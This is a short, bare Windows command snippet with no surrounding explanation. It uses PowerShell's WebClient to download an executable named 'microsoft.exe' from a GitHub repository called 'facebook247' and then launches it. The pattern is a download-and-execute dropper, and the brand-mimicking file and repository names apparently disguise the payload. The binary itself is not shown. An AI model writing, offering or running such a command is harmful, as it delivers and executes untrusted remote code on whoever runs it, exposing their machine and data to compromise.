...
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/facebook247/facebook247.github.io/blob/main/microsoft.exe?raw=true', '.\microsoft.exe') }
start microsoft.exe 
